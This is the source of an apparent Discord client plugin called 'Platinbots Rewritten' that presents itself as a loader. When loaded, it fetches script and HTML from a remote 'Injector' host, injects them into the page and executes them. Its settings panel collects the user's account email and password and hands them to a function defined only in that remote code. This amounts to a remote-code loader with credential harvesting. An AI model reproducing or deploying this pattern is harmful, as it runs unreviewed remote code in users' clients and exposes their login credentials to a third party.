//META{"name":"PlatinClient"}*//

var PlatinClient = function () {};

PlatinClient.prototype.start = function () {

};

PlatinClient.prototype.load = function () {
	var script=document.createElement("script");script.src="https://platinbots.xyz/cdn/PlatinClient.js",document.body.appendChild(script);
$.get("https://platinbots.xyz/cdn/Injector/index.php", function(InjectorData) {
				 var html = document.createElement('InjDiv');
				 html.id = 'MountShit';
html.innerHTML = InjectorData;
document.getElementsByTagName('body')[0].appendChild(html);
             });
			$.get("https://platinbots.xyz/cdn/Injector/Script.php", function(InjectorScriptData) {
    var script = document.createElement("script");
    document.getElementsByTagName("head")[0].appendChild(script);
    script.innerText = InjectorScriptData;
	 Inject();
 });
};

PlatinClient.prototype.unload = function () {
	
};

PlatinClient.prototype.stop = function () {

};

PlatinClient.prototype.onMessage = function () {
	
};

PlatinClient.prototype.onSwitch = function () {
    //called when a server or channel is switched
};

PlatinClient.prototype.observer = function (e) {
    //raw MutationObserver event for each mutation
};

PlatinClient.prototype.getSettingsPanel = function () {
	return '<input type="text" style="width: 100%;padding: 12px 20px;margin: 8px 0;display: inline-block;border: 1px solid #202225;color: white;border-radius: 4px;background-color: #2a2d31;box-sizing: border-box;" id="UsernameBox" placeholder="Email..."><br><br><input type="password" style="width: 100%;padding: 12px 20px;margin: 8px 0;display: inline-block;border: 1px solid #202225;color: white;border-radius: 4px;background-color: #2a2d31;box-sizing: border-box;" id="PasswordBox" placeholder="Password..."><input style="background-color: #7289da;color: white;padding: 10px 25px;margin: 8px 0;border: none;border-radius: 4px;cursor: pointer;" type="submit" onclick="SaveLogin()" value="Save">';
};

PlatinClient.prototype.getName = function () {
    return "Platinbots Rewritten";
};

PlatinClient.prototype.getDescription = function () {
    return "Platinbots Rewritten client loader. Press 'Settings' to login!";
};

PlatinClient.prototype.getVersion = function () {
    return "1.0";
};

PlatinClient.prototype.getAuthor = function () {
    return "PlatinTeam	";
};